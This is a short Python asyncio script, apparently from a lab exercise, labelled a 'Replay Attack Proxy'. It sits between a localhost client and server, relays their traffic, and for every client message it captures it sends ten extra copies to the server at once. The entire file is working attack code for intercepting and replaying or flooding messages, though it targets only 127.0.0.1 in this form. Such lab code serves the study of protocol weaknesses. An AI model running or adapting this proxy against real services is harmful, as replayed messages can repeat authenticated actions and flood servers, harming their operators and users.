import asyncio

# =============================================================================
# Replay Attack Proxy (v4 - VRAUUUU EDITION)
#
# Sits between client (port 9999) and server (port 8888).
# Goal: Instantaneously flood the target with 10 replays.
# =============================================================================

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 9999
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8888

async def flood_task(dst: asyncio.StreamWriter, payload: str):
    """Replays the captured message 10 times instantly."""
    print(f"\n[ATTACK] VRAUUUUU! SENDING 10 REPLAYS INSTANTLY...")
    for _ in range(10):
        dst.write(f"MSG:{payload}\n".encode())
    await dst.drain()

async def relay(label: str, src: asyncio.StreamReader, dst: asyncio.StreamWriter):
    try:
        while True:
            line = await src.readline()
            if not line:
                break
            
            # Forward original message
            dst.write(line)
            await dst.drain()

            # Inspect for MSG to trigger a flood
            try:
                text = line.decode().strip()
                msg_type, _, payload = text.partition(":")
                if msg_type == "MSG" and payload and "C→S" in label:
                    print(f"[{label}] MSG captured! VRAUUUUU MODE TRIGGERED!")
                    asyncio.create_task(flood_task(dst, payload))
            except Exception:
                pass

    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    finally:
        dst.close()

async def handle_client(client_reader: asyncio.StreamReader, client_writer: asyncio.StreamWriter):
    addr = client_writer.get_extra_info("peername")
    print(f"[REPLAY] New connection from {addr}")
    try:
        server_reader, server_writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
        await asyncio.gather(
            relay("C→S", client_reader, server_writer),
            relay("S→C", server_reader, client_writer),
        )
    except Exception as e:
        print(f"[ERROR] {e}")
    print(f"[REPLAY] Connection from {addr} closed.")

async def main():
    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT)
    print(f"[REPLAY] Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[REPLAY] VRAUUUUU MODE ACTIVE: 10 instant replays per message!")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())
